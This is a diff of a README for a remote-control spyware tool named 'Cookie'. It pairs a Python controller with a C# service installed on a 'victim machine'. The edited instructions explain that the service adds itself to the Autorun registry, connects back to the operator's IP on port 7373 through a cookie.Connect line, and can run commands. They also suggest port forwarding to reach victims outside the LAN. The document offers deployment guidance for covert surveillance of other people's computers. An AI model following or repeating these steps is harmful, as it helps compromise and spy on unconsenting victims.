@@ -8,15 +8,15 @@ It's a spyware so... spy! It can do every thing through the __cmd__ (it works on
 >Cookie_Client
 >>Cookie_Server
 
-- The Cookie Client is the scrpit Python, this is the script that you have to use for controlling the victim machine;
+- The Cookie Server is the scrpit Python, this is the script that you have to use for controlling the victim machine;
 
-You can use it on your mobile phone (use QPython) or in your computers. You have to set only the IP of the victim, it have to be in your LAN or you have to use __Cookie__ with a __Backdoor__. The default port i [7373]
+You can use it on your mobile phone (use QPython) or in your computers. You have to set only the IP, the victim has to be in your LAN or you have to use a forward port. The default port is [7373]
 
-- The Cookie Server is the C# service; You have to change the IP and the default port:
+- The Cookie Client is the C# service; You have to change the IP and the default port to your ip:
 
 >cookie.Connect("127.0.0.1",7373);
 
 You must install it on victim machine and in some way (there are a lot of ways) start it, then it writes it self in the Autorun registry.
-Then you have just to connect with Cookie Client.
+Then it will search for Cookie Server.
 
 
